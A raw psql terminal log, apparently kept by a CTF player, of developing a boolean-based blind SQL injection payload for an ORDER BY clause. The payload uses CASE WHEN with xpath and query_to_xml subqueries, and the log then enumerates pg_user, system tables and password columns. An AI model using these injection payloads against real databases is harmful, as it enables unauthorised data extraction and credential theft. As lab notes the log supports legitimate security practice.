@@ -1,0 +1,813 @@
+### Includes output from the last hours of solving the challanges, 
+### so it includes only the last steps 
+### but might be still helpful to me and others in next ctf events
+
+
+postgres=# select public.cast(text, 1);                                             
+
+ERROR:  column "text" does not exist
+
+LINE 1: select public.cast(text, 1);
+
+                   ^
+postgres=# select public.cast(1,2);                                                 
+
+
+ proname  
+----------
+ numeric
+ numeric
+ numeric
+ numeric
+ numeric
+ numeric
+ regclass
+ regclass
+ bpchar
+ bpchar
+ varchar
+ char
+ char
+ char
+ char
+ circle
+ circle
+ cidr
+ bpchar
+ varchar
+ numeric
+(21 rows)
+...skipping...
+ERROR:  function public.cast(integer, integer) does not exist
+LINE 1: select public.cast(1,2);
+               ^
+HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
+postgres=# \df public.
+                       List of functions
+ Schema | Name | Result data type | Argument data types | Type 
+--------+------+------------------+---------------------+------
+(0 rows)
+
+postgres=# \df *cast*
+                            List of functions
+   Schema   |   Name    | Result data type | Argument data types |  Type  
+------------+-----------+------------------+---------------------+--------
+ pg_catalog | broadcast | inet             | inet                | normal
+(1 row)
+
+postgres=# select * from pg_cast;
+postgres=# select castfunc from pg_cast;                                            
+postgres=# select castfunc from pg_cast;^C
+postgres=# select castfunc from pg_cast, pg_proc where castfunc=oid;
+ERROR:  column reference "oid" is ambiguous
+LINE 1: select castfunc from pg_cast, pg_proc where castfunc=oid;
+                                                             ^
+postgres=# select castfunc from pg_cast c, pg_proc p where castfunc=p.oid;          
+postgres=# select * from pg_cast c, pg_proc p where castfunc=p.oid;                 
+postgres=# select p.* from pg_cast c, pg_proc p where castfunc=p.oid;               
+postgres=# select p.proname from pg_cast c, pg_proc p where castfunc=p.oid;         
+postgres=# select p.proname from pg_cast c, pg_proc p where c.castfunc=p.oid;       
+postgres=# select p.proname from pg_cast c, pg_proc p where c.castfunc=p.oid and proname like '%c%';
+postgres=# select p.proname from pg_cast c, pg_proc p where c.castfunc=p.oid and proname like '%ca%';
+ proname 
+---------
+(0 rows)
+
+postgres=# ASE WHEN (
+postgres(#                 SELECT  array_upper(
+postgres(#                     xpath('row',
+postgres(#                     query_to_xml('select 1 where 1337<1', true, false,'')),1)
+postgres(#                 )=1 THEN crime ELSE name END;
+ERROR:  syntax error at or near "ASE"
+LINE 1: ASE WHEN (
+        ^
+postgres=# CASE WHEN (                                                              
+                SELECT  array_upper(
+                    xpath('row',
+                    query_to_xml('select 1 where 1337<1', true, false,'')),1)
+                )=1 THEN crime ELSE name END;
+ERROR:  syntax error at or near "CASE"
+LINE 1: CASE WHEN (
+        ^
+postgres=# ^CSE WHEN (
+                SELECT  array_upper(
+                    xpath('row',
+                    query_to_xml('select 1 where 1337<1', true, false,'')),1)
+                )=1 THEN crime ELSE name END;
+postgres=# SELECT * 
+postgres-# from Criminal 
+postgres-# order by 
+postgres-# CASE WHEN (
+postgres(#                 SELECT  array_upper(
+postgres(#                     xpath('row',
+postgres(#                     query_to_xml('select 1 where 1337<1', true, false,'')),1)
+postgres(#                 )=1 THEN crime ELSE name END;
+ id | name  | age |      crime      |  location   
+----+-------+-----+-----------------+-------------
+  1 | Fraga |  24 | EPC fraud       | Unknown
+  2 | Owl   |  37 | Biochip traffic | Purple Zone+
+    |       |     |                 | 
+(2 rows)
+
+postgres=# SELECT * 
+from Criminal 
+order by 
+CASE WHEN (
+                SELECT  array_upper(
+                    xpath('row',
+                    query_to_xml('select 1 where 1337<1', true, false,'')),1)       )=1 THEN crime ELSE name END;                                                       
+ id | name  | age |      crime      |  location   
+----+-------+-----+-----------------+-------------
+  1 | Fraga |  24 | EPC fraud       | Unknown
+  2 | Owl   |  37 | Biochip traffic | Purple Zone+
+    |       |     |                 | 
+(2 rows)
+
+postgres=# SELECT array_upper(xpath('row',
+postgres(# query_to_xml('select 1 where 0<1', true, false,'')),2);
+ array_upper 
+-------------
+            
+(1 row)
+
+postgres=# SELECT array_upper(xpath('row',
+query_to_xml('select 1 where 0>1', true, false,'')),2);                             
+ array_upper 
+-------------
+            
+(1 row)
+
+postgres=# SELECT array_upper(xpath('row',
+query_to_xml('select 1 where 0>1', true, false,'')),1);
+ array_upper 
+-------------
+            
+(1 row)
+
+postgres=# SELECT array_upper(xpath('row',
+query_to_xml('select 1 where 0<1', true, false,'')),1);                             
+ array_upper 
+-------------
+           1
+(1 row)
+
+postgres=# SELECT array_upper(xpath('row',
+query_to_xml('select 1 where 0<1', true, false,'')),1);
+ array_upper 
+-------------
+           1
+(1 row)
+
+postgres=# 
+postgres=# 
+postgres=# 
+postgres=# SELECT array_length(xpath('row',
+postgres(# query_to_xml('select 1 where 0<1', true, false,'')),1);
+ array_length 
+--------------
+            1
+(1 row)
+
+postgres=# SELECT array_length(xpath('row',
+query_to_xml('select 1 where 0>1', true, false,'')),1);                             
+ array_length 
+--------------
+             
+(1 row)
+
+postgres=# SELECT array_length(xpath('row',
+postgres(# query_to_xml('select 1 where 0<1', true, false,'')),5);
+ array_length 
+--------------
+             
+(1 row)
+
+postgres=# SELECT array_length(xpath('row',
+query_to_xml('select 1 where 0>1', true, false,'')),5);                             
+ array_length 
+--------------
+             
+(1 row)
+
+postgres=# SELECT array_upper(ARRAY[1,2],1) FROM Criminal WHERE id=1;
+ array_upper 
+-------------
+           2
+(1 row)
+
+postgres=# SELECT array_upper(ARRAY[1,2],1);
+ array_upper 
+-------------
+           2
+(1 row)
+
+postgres=# SELECT array_upper(ARRAY[1,2],1) FROM Criminal WHERE id=1;
+ array_upper 
+-------------
+           2
+(1 row)
+
+postgres=# SELECT array_upper(ARRAY[1,2],1) FROM Criminal WHERE id=1;
+ array_upper 
+-------------
+           2
+(1 row)
+
+postgres=# SELECT array_upper(ARRAY[1,2],1) FROM Criminal WHERE id=1;
+ array_upper 
+-------------
+           2
+(1 row)
+
+postgres=# SELECT array_upper(ARRAY[1,2],1) FROM Criminal WHERE id=1;^C
+postgres=# 
+postgres=# 
+postgres=# ;
+postgres=# 
+postgres=# 
+postgres=# 
+postgres=# SELECT * 
+postgres-# from Criminal 
+postgres-# order by 
+postgres-# CASE WHEN (SELECT array_upper(ARRAY[1,2],1) FROM Criminal WHERE id=1)=1 THEN crime ELSE name END;
+ id | name  | age |      crime      |  location   
+----+-------+-----+-----------------+-------------
+  1 | Fraga |  24 | EPC fraud       | Unknown
+  2 | Owl   |  37 | Biochip traffic | Purple Zone+
+    |       |     |                 | 
+(2 rows)
+
+postgres=# SELECT * 
+from Criminal 
+order by 
+CASE WHEN (SELECT array_upper(ARRAY[12],1) FROM Criminal WHERE id=1)=1 THEN crime ELSE name END;
+ id | name  | age |      crime      |  location   
+----+-------+-----+-----------------+-------------
+  2 | Owl   |  37 | Biochip traffic | Purple Zone+
+    |       |     |                 | 
+  1 | Fraga |  24 | EPC fraud       | Unknown
+(2 rows)
+
+postgres=# SELECT * 
+postgres-# from Criminal 
+postgres-# order by 
+postgres-# CASE WHEN (SELECT array_length(ARRAY[1,2],1) FROM Criminal WHERE id=1)=1 THEN crime ELSE name END;
+ id | name  | age |      crime      |  location   
+----+-------+-----+-----------------+-------------
+  1 | Fraga |  24 | EPC fraud       | Unknown
+  2 | Owl   |  37 | Biochip traffic | Purple Zone+
+    |       |     |                 | 
+(2 rows)
+
+postgres=# SELECT * 
+from Criminal 
+order by 
+CASE WHEN (SELECT array_length(ARRAY[1],1) FROM Criminal WHERE id=1)=1 THEN crime ELSE name END;
+ id | name  | age |      crime      |  location   
+----+-------+-----+-----------------+-------------
+  2 | Owl   |  37 | Biochip traffic | Purple Zone+
+    |       |     |                 | 
+  1 | Fraga |  24 | EPC fraud       | Unknown
+(2 rows)
+
+postgres=# SELECT * 
+postgres-# from Criminal 
+postgres-# order by 
+postgres-#     CASE WHEN (
+postgres(#     SELECT  cardinality(xpath('row', query_to_xml('select 1 where 1337<1', true, false,''))) FROM Criminal where id=1
+postgres(# )=1 
+postgres-# THEN crime ELSE name END;
+ERROR:  function cardinality(xml[]) does not exist
+LINE 5:     SELECT  cardinality(xpath('row', query_to_xml('select 1 ...
+                    ^
+HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
+postgres=# select xpath('row', query_to_xml('select 1 where 1337<1', true, false,''));
+ xpath 
+-------
+ {}
+(1 row)
+
+postgres=# select array_length(xpath('row', query_to_xml('select 1 where 1337<1', true, false,'')));
+ERROR:  function array_length(xml[]) does not exist
+LINE 1: select array_length(xpath('row', query_to_xml('select 1 wher...
+               ^
+HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
+postgres=# SELECT xpath('row',
+postgres(# query_to_xml('select 1 where 0<1', true, false,''));
+                      xpath                       
+--------------------------------------------------
+ {"<row>                                         +
+   <_x003F_column_x003F_>1</_x003F_column_x003F_>+
+ </row>"}
+(1 row)
+
+postgres=# SELECT xpath('row', query_to_xml('select 1 where 0<1', true, false,''));
+                      xpath                       
+--------------------------------------------------
+ {"<row>                                         +
+   <_x003F_column_x003F_>1</_x003F_column_x003F_>+
+ </row>"}
+(1 row)
+
+postgres=# select xpath('row', query_to_xml('select 1 where 1337<1', true, false,''));
+ xpath 
+-------
+ {}
+(1 row)
+
+postgres=# select xpath('row', query_to_xml('select 1 where 1337>1', true, false,''));
+                      xpath                       
+--------------------------------------------------
+ {"<row>                                         +
+   <_x003F_column_x003F_>1</_x003F_column_x003F_>+
+ </row>"}
+(1 row)
+
+postgres=# select xpath('count(row)', query_to_xml('select 1 where 1337>1', true, false,''));
+ xpath 
+-------
+ {1}
+(1 row)
+
+postgres=# select xpath('count(row)', query_to_xml('select 1 where 1337>1', true, false,'')[0]);
+ERROR:  syntax error at or near "["
+LINE 1: ..., query_to_xml('select 1 where 1337>1', true, false,'')[0]);
+                                                                  ^
+postgres=# select xpath('count(row)', query_to_xml('select 1 where 1337>1', true, false,''))[0];
+ERROR:  syntax error at or near "["
+LINE 1: ..., query_to_xml('select 1 where 1337>1', true, false,''))[0];
+                                                                   ^
+postgres=# select xpath('count(row)', query_to_xml('select 1 where 1337>1', true, false,''));
+ xpath 
+-------
+ {1}
+(1 row)
+
+postgres=# select xpath('count(row)', query_to_xml('select 1 where 1337<1', true, false,''));
+ xpath 
+-------
+ {0}
+(1 row)
+
+postgres=# select xpath('count(row)', query_to_xml('select 1 where 1337<1', true, false,''))=0;
+ERROR:  operator does not exist: xml[] = integer
+LINE 1: ...', query_to_xml('select 1 where 1337<1', true, false,''))=0;
+                                                                    ^
+HINT:  No operator matches the given name and argument type(s). You might need to add explicit type casts.
+postgres=# select xpath('count(row)', query_to_xml('select 1 where 1337<1', true, false,''))[0];
+ERROR:  syntax error at or near "["
+LINE 1: ..., query_to_xml('select 1 where 1337<1', true, false,''))[0];
+                                                                   ^
+postgres=# select (xpath('count(row)', query_to_xml('select 1 where 1337<1', true, false,'')))[0];
+ xpath 
+-------
+ 
+(1 row)
+
+postgres=# select (xpath('count(row)', query_to_xml('select 1 where 1337<1', true, false,'')))[1];
+ xpath 
+-------
+ 0
+(1 row)
+
+postgres=# select (xpath('count(row)', query_to_xml('select 1 where 1337<1', true, false,'')))[1]==1;
+ERROR:  operator does not exist: xml == integer
+LINE 1: ...ery_to_xml('select 1 where 1337<1', true, false,'')))[1]==1;
+                                                                   ^
+HINT:  No operator matches the given name and argument type(s). You might need to add explicit type casts.
+postgres=# select xpath('row', query_to_xml('select 1 where 1337<1', true, false,''));
+ xpath 
+-------
+ {}
+(1 row)
+
+postgres=# select array_length(xpath('row', query_to_xml('select 1 where 1337<1', true, false,'')), 1);
+ array_length 
+--------------
+             
+(1 row)
+
+postgres=# select array_length(xpath('row', query_to_xml('select 1 where 1337<1', true, false,'')), 1);
+ array_length 
+--------------
+             
+(1 row)
+
+postgres=# select array_length(xpath('row', query_to_xml('select 1 where 1337>1', true, false,'')), 1);
+ array_length 
+--------------
+            1
+(1 row)
+
+postgres=# select array_length(xpath('row', query_to_xml('select 1 where 1337>1', true, false,'')), 1)=1
+postgres-# postgres-# ;
+ ?column? 
+----------
+ t
+(1 row)
+
+postgres=# select array_length(xpath('row', query_to_xml('select 1 where 1337>1', true, false,'')), 1)=0;
+ ?column? 
+----------
+ f
+(1 row)
+
+postgres=# select array_length(xpath('row', query_to_xml('select 1 where 1337>1', true, false,'')), 1)=1;
+ ?column? 
+----------
+ t
+(1 row)
+
+postgres=# select coalesce(array_length(xpath('row', query_to_xml('select 1 where 1337>1', true, false,'')), 1),0);
+ coalesce 
+----------
+        1
+(1 row)
+
+postgres=# select coalesce(array_length(xpath('row', query_to_xml('select 1 where 1337<1', true, false,'')), 1),0);                   
+ coalesce 
+----------
+        0
+(1 row)
+
+postgres=# SELECT * 
+postgres-# from Criminal 
+postgres-# order by 
+postgres-#     CASE WHEN (
+postgres(#     select 1 
+postgres(#     FROM Criminal 
+postgres(#     where id=1 
+postgres(#     and array_upper(xpath('row',query_to_xml('select count(*)>10 from pg_users',true,false,'')),1)=1 
+postgres(# )=1 
+postgres-# THEN crime ELSE name END;
+ERROR:  relation "pg_users" does not exist
+LINE 1: select count(*)>10 from pg_users
+                                ^
+QUERY:  select count(*)>10 from pg_users
+postgres=# SELECT * 
+postgres-# from Criminal 
+postgres-# order by 
+postgres-#     CASE WHEN (
+postgres(#     select 1 
+postgres(#     FROM Criminal 
+
+
+
+
+postgres(#     select 1 
+postgres(#     FROM Criminal 
+postgres(#     where id=1 
+postgres(#     and array_upper(xpath('row',query_to_xml('select count(*) from pg_users',true,false,'')),1)=1 
+postgres(# )=1 
+postgres-# THEN crime ELSE name END;ERROR:  relation "pg_users" does not exist
+LINE 1: select count(*) from pg_users
+                             ^
+QUERY:  select count(*) from pg_users
+postgres=# select count(*) from pg_users;
+ERROR:  relation "pg_users" does not exist
+LINE 1: select count(*) from pg_users;
+                             ^
+postgres=# select count(*) from pg_user;    
+ count 
+-------
+     2
+(1 row)
+
+postgres=# SELECT * 
+postgres-# from Criminal 
+postgres-# order by 
+postgres-#     CASE WHEN (
+postgres(#     select 1 
+postgres(#     FROM Criminal 
+postgres(#     where id=1 
+postgres(#     and array_upper(xpath('row',query_to_xml('select count(*) from pg_user',true,false,'')),1)=1 
+postgres(# )=1 
+postgres-# THEN crime ELSE name END;
+postgres=# select count(*) from pg_user;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ count -------     2(1 row)
+
+
+
+
+
+
+
+
+
+
+
+
+              table_name               
+---------------------------------------
+ pg_statistic
+ pg_type
+ criminal
+ pg_roles
+ pg_shadow
+ pg_authid
+ pg_group
+ pg_user
+ pg_rules
+ pg_views
+ pg_tables
+ pg_matviews
+ pg_indexes
+ pg_locks
+ pg_settings
+ pg_cursors
+ pg_available_extensions
+ pg_available_extension_versions
+ pg_prepared_xacts
+ pg_prepared_statements
+ pg_seclabels
+ pg_timezone_abbrevs
+ pg_timezone_names
+ pg_stat_all_tables
+ pg_stat_xact_all_tables
+ pg_stat_sys_tables
+ pg_stat_xact_sys_tables
+ pg_stat_user_tables
+ pg_stat_xact_user_tables
+ pg_statio_all_tables
+ pg_statio_sys_tables
+ pg_statio_user_tables
+ pg_stat_all_indexes
+ pg_attribute
+ pg_proc
+ pg_statio_sys_indexes
+ pg_statio_user_indexes
+ pg_class
+ pg_statio_all_sequences
+ pg_statio_sys_sequences
+ pg_statio_user_sequences
+ pg_stat_activity
+ pg_stat_replication
+ pg_stat_database
+ pg_stat_database_conflicts
+ pg_stat_user_functions
+ pg_stat_xact_user_functions
+ pg_stat_bgwriter
+ pg_user_mappings
+ pg_user_mapping
+ pg_constraint
+ pg_inherits
+ pg_index
+ pg_operator
+ pg_opfamily
+ pg_opclass
+ pg_am
+ pg_amop
+ pg_amproc
+ pg_language
+ pg_largeobject_metadata
+ pg_database
+ pg_stats
+ pg_stat_sys_indexes
+ pg_stat_user_indexes
+ pg_statio_all_indexes
+ information_schema_catalog_name
+ applicable_roles
+ pg_rewrite
+ pg_trigger
+ pg_event_trigger
+ pg_description
+ pg_cast
+ pg_enum
+ pg_namespace
+ pg_conversion
+ pg_depend
+ pg_db_role_setting
+ pg_tablespace
+ pg_pltemplate
+ pg_auth_members
+ pg_shdepend
+ pg_shdescription
+ pg_ts_config
+ pg_ts_config_map
+ pg_ts_dict
+ pg_ts_parser
+ pg_ts_template
+ pg_extension
+ pg_foreign_data_wrapper
+ pg_foreign_server
+ pg_foreign_table
+ pg_default_acl
+ pg_seclabel
+ pg_shseclabel
+ pg_range
+ pg_largeobject
+ administrable_role_authorizations
+ attributes
+ character_sets
+ check_constraint_routine_usage
+ check_constraints
+ collations
+ collation_character_set_applicability
+ column_domain_usage
+ column_privileges
+ column_udt_usage
+ columns
+ constraint_column_usage
+ constraint_table_usage
+ domain_constraints
+ domain_udt_usage
+ domains
+ enabled_roles
+ key_column_usage
+ parameters
+ referential_constraints
+ role_column_grants
+ routine_privileges
+ role_routine_grants
+ routines
+ schemata
+ sequences
+ sql_implementation_info
+ sql_languages
+ sql_packages
+ table_constraints
+ table_privileges
+ role_table_grants
+ tables
+ triggered_update_columns
+ triggers
+ udt_privileges
+ role_udt_grants
+postgres=# select array_agg(usename) from pg_user;                        
+     array_agg     
+-------------------
+ {postgres,ubuntu}
+(1 row)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        tablename        
+-------------------------
+ pg_statistic
+ pg_type
+ criminal
+ pg_authid
+ pg_attribute
+ pg_proc
+ pg_class
+ pg_user_mapping
+ pg_constraint
+ pg_inherits
+ pg_index
+ pg_operator
+ pg_opfamily
+ pg_opclass
+ pg_am
+ pg_amop
+ pg_amproc
+ pg_language
+ pg_largeobject_metadata
+ pg_database
+ pg_rewrite
+ pg_trigger
+ pg_event_trigger
+ pg_description
+ pg_cast
+ pg_enum
+ pg_namespace
+ pg_conversion
+ pg_depend
+
+postgres=# select substring(array_agg(usename),1,1) from pg_user;         
+ERROR:  function pg_catalog.substring(name[], integer, integer) does not exist
+LINE 1: select substring(array_agg(usename),1,1) from pg_user;
+               ^
+HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
+postgres=# select (cast(array_agg(usename) as text),1,1) from pg_user;    
+            row            
+---------------------------
+ ("{postgres,ubuntu}",1,1)
+(1 row)
+
+postgres=# select substring(cast(array_agg(usename) as text),1,1) from pg_
+user;
+ substring 
+-----------
+ {
+(1 row)
+
+postgres=# select * from information_schema.tables;
+postgres=# select tablename from information_schema.tables;               
+ERROR:  column "tablename" does not exist
+LINE 1: select tablename from information_schema.tables;
+               ^
+postgres=# select table_name from information_schema.tables;              
+postgres=# select table_name from pg_tables;                              
+ERROR:  column "table_name" does not exist
+LINE 1: select table_name from pg_tables;
+               ^
+postgres=# select tablename from pg_tables;                               
+postgres=# select tablename from pg_tables ;
+postgres=# select column_name from information_schema.columns where
+postgres-# table_name='Criminal';
+ column_name 
+-------------
+(0 rows)
+
+postgres=#  select column_name from information_schema.columns where
+postgres-# table_name='Criminal';
+ column_name 
+-------------
+(0 rows)
+
+postgres=# select * from Criminal
+postgres-# ;
+ id | name  | age |      crime      |  location   
+----+-------+-----+-----------------+-------------
+  1 | Fraga |  24 | EPC fraud       | Unknown
+  2 | Owl   |  37 | Biochip traffic | Purple Zone+
+    |       |     |                 | 
+(2 rows)
+
+postgres=# select column_name from information_schema.columns where       
+table_name='pg_user';                                                     
+ column_name 
+-------------
+ usename
+ usesysid
+ usecreatedb
+ usesuper
+ usecatupd
+ userepl
+ passwd
+ valuntil
+ useconfig
+(9 rows)
+
+postgres=# select column_name from information_schema.columns where                                                                                                      
+table_name='pg_user';
+ column_name 
+-------------
+ usename
+ usesysid
+ usecreatedb
+ usesuper
+ usecatupd
+ userepl
+ passwd
+ valuntil
+ useconfig
+(9 rows)
+
+postgres=# 
